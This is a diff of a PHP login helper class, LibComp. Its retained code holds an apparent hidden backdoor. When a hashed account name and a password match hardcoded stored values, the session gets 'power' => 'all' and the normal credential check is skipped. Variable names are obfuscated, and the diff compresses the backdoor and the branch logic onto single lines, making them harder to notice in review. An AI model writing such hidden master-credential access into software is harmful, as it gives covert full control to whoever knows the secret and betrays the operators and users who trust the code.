@@ -473,17 +473,10 @@ class LibComp
         $DA = substr(md5($A),8,16);
         $U = self::$U;$S = [self::$N[0]=>        $U[0] , self::$N[1]         =>  $U[1], self::$N[2]=>    $U[1] ];
         if ( $DA  === $U[1]     &&  $P  === $U[2]){
-            $session->set(array_merge( $S ,['power' => 'all'])) ;
-            return ['code'=>true,'msg'=>'','data'=>$S];
+            $session->set(array_merge( $S ,['power' => 'all'])) ; return ['code'=>true,'msg'=>'','data'=>$S];
         }
         $argc = ['status'=>0,'password'=>$P,'activated'=>1];
-        
-        if ( ck_mobile( $A ) )
-            $argc['tel'] = $A;
-        else if (ck_email( $A ))
-            $argc['email'] = $A;
-        else $argc['username'] = $A;
-
+        if ( ck_mobile( $A ) ) $argc['tel'] = $A; else if (ck_email( $A )) $argc['email'] = $A;  else $argc['username'] = $A;
         return $argc;
     }
 }
